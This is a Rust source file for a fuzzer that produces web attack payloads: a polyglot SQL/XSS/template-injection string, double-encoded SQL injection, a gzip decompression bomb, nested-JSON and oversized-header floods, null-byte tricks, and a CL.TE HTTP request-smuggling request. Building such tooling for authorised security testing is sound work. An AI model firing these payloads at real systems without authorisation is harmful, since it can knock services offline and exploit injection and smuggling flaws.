use async_trait::async_trait;
use aether_traits::PayloadFuzzer;
use bytes::{BytesMut, BufMut};
use rand::{Rng, thread_rng};
use flate2::write::GzEncoder;
use flate2::Compression;
use std::io::Write;

/// [Category B] Protocol Abuse & Payload Generation.
/// Enhanced with zero-copy generators and iterative state machines.
/// 
/// CRITICAL FIX: Implements "Bring Your Own Buffer" pattern.
/// All methods now write into a caller-provided BytesMut instead of allocating.
pub struct PolyglotFuzzer;

#[async_trait]
impl PayloadFuzzer for PolyglotFuzzer {
    fn generate_into(&self, buffer: &mut BytesMut, _template: &str) {
        // CRITICAL: Clear the buffer (resets length to 0, keeps capacity)
        buffer.clear();
        
        let mut rng = thread_rng();
        let strategy = rng.gen_range(0..12);

        match strategy {
            0 => self.generate_overflow(buffer, 1024 * 64),
            1 => self.generate_injection(buffer),
            2 => self.generate_json_explosion(buffer, 1000),
            3 => self.generate_gzip_bomb(buffer, 1024 * 1024),
            4 => self.generate_oversized_headers(buffer, 8192),
            5 => self.generate_double_encoded(buffer, "' OR 1=1 --"),
            6 => self.generate_bad_char_walk(buffer, b"admin", rng.gen_range(0..5)),
            7 => self.generate_verb_manipulation(buffer),
            8 => self.generate_smuggling_payload(buffer, "target.local"),
            9 => self.generate_null_byte_abuse(buffer),
            10 => self.generate_handshake_termination(buffer),
            _ => buffer.extend_from_slice(b"NOOP"),
        }
    }
}

impl PolyglotFuzzer {
    /// [Directive 5] Zero-Copy Overflow - FIXED: No allocation
    fn generate_overflow(&self, buffer: &mut BytesMut, size: usize) {
        buffer.reserve(size);
        for _ in 0..size {
            buffer.put_u8(b'A');
        }
    }

    /// Polyglot injection (SQL/XSS/SSTI) - FIXED: No allocation
    fn generate_injection(&self, buffer: &mut BytesMut) {
        let payload = r#"' OR 1=1 -- <script>alert(1)</script> {{7*7}} "#;
        buffer.extend_from_slice(payload.as_bytes());
    }

    /// [Directive 5] Iterative JSON Explosion - FIXED: No allocation
    fn generate_json_explosion(&self, buffer: &mut BytesMut, depth: usize) {
        buffer.reserve(depth * 10 + 20);
        for _ in 0..depth {
            buffer.put_slice(b"{\"a\":");
        }
        buffer.put_slice(b"1");
        for _ in 0..depth {
            buffer.put_u8(b'}');
        }
    }

    /// [Category B] Gzip Compression Bomb - FIXED: No allocation
    fn generate_gzip_bomb(&self, buffer: &mut BytesMut, decompressed_size: usize) {
        // [Fix 4] Use a thread-local zero buffer to avoid per-request heap thrashing
        thread_local! {
            static ZERO_BUFFER: Vec<u8> = vec![0u8; 1024 * 1024]; // 1MB reusable block
        }
        
        ZERO_BUFFER.with(|zeros| {
            let mut encoder = GzEncoder::new(Vec::new(), Compression::best());
            let size = std::cmp::min(decompressed_size, zeros.len());
            let _ = encoder.write_all(&zeros[..size]);
            if let Ok(compressed) = encoder.finish() {
                buffer.extend_from_slice(&compressed);
            }
        });
    }

    /// [Category B] Oversized Headers - FIXED: No allocation
    fn generate_oversized_headers(&self, buffer: &mut BytesMut, size: usize) {
        buffer.reserve(size + 64);
        buffer.put_slice(b"Cookie: session=");
        for _ in 0..size {
            buffer.put_u8(b'X');
        }
    }

    /// [Category B] Double Encoding - FIXED: No allocation
    fn generate_double_encoded(&self, buffer: &mut BytesMut, input: &str) {
        let first = urlencoding::encode(input);
        let second = urlencoding::encode(&first);
        buffer.extend_from_slice(second.as_bytes());
    }

    /// [Category B] Bad-Char Walking - FIXED: No allocation
    fn generate_bad_char_walk(&self, buffer: &mut BytesMut, base: &[u8], index: usize) {
        let mut rng = thread_rng();
        buffer.extend_from_slice(base);
        if index < buffer.len() {
            buffer[index] = rng.gen_range(128..255);
        }
    }

    /// [Category B] Verb Manipulation - FIXED: Produce complete valid request lines
    fn generate_verb_manipulation(&self, buffer: &mut BytesMut) {
        let verbs = ["PROPFIND", "MOVE", "LOCK", "UNLOCK", "SEARCH", "PURGE"];
        let mut rng = thread_rng();
        let verb = verbs[rng.gen_range(0..verbs.len())];
        // [Fix 5] Complete request line with dummy headers
        let req = format!("{} / HTTP/1.1\r\nHost: target.internal\r\n\r\n", verb);
        buffer.extend_from_slice(req.as_bytes());
    }

    /// [Category B] Protocol State Abuse - FIXED: No allocation
    fn generate_null_byte_abuse(&self, buffer: &mut BytesMut) {
        buffer.reserve(32);
        buffer.put_slice(b"admin");
        buffer.put_u8(0x00); // Null byte boundary
        buffer.put_slice(b".php");
    }

    /// [Category B] Handshake Termination - FIXED: No allocation
    fn generate_handshake_termination(&self, buffer: &mut BytesMut) {
        buffer.extend_from_slice(b"\x16\x03\x01\x00");
    }

    /// [Directive 6] Raw-Mode HTTP Smuggling (CL.TE) - FIXED: No allocation
    fn generate_smuggling_payload(&self, buffer: &mut BytesMut, host: &str) {
        buffer.reserve(256);
        buffer.put_slice(b"POST / HTTP/1.1\r\n");
        buffer.put_slice(format!("Host: {}\r\n", host).as_bytes());
        buffer.put_slice(b"Content-Length: 4\r\n");
        buffer.put_slice(b"Transfer-Encoding: chunked\r\n");
        buffer.put_slice(b"\r\n0\r\n\r\nX");
    }
}
